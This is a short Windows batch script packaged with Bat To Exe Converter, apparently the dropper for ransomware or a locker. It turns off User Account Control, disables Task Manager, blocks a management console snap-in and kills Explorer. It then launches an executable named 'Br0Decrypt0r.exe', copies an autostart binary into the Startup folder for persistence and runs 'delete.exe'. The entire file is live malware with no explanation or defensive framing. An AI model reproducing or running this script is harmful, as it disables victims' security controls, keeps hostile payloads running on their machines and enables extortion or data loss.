::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCmLP2O7o1cgzO3o5P6IsnE8QfYwa5vayKDAJfgWig==
::fBE1pAF6MU+EWHreyHcjLQlHcCmLP2O7o1cgzO3o5P6IsnEZUe46bIqV36yLQA==
::fBE1pAF6MU+EWHreyHcjLQlHcCmLP2O7o1cgzO3o5P6IsnE/RrIbfYzJw6SacPJd713hFQ==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDZdTwyDmYmGNrwf/P3p6vm7pVkcGus8d+8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDZdTwyDmYmGIrAP4/z0/9aAtkwiR+NxfZfeug==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
cd %b2eincfilepath%
timeout 3 >nul
start Br0Decrypt0r.exe
copy Autostart.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start delete.exe